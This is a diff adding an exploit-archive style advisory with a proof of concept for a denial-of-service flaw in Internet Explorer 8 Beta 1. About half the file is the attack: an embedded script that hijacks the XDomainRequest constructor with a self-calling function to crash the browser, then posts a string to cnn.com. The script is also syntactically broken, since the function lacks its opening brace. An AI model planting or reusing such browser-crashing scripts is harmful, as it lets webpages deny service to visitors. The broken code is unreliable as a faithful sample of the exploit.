@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/28580/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability.
+
+An attacker may exploit this issue by enticing victims into opening a maliciously crafted webpage.
+
+Successfully exploiting this issue will allow attackers to crash the application, denying service to legitimate users.
+
+This issue affects Microsoft Internet Explorer 8 Beta 1. 
+
+<script>
+
+// trying prototype hijacking here.
+
+xdr = XDomainRequest;
+
+XDomainRequest = function() 
+
+return new XDomainRequest();
+
+}
+
+
+
+ping = 'hello';
+
+xdr = new XDomainRequest(); 
+
+xdr.open("POST", "http://cnn.com"); 
+
+xdr.send(ping);
+
+
+
+</script>
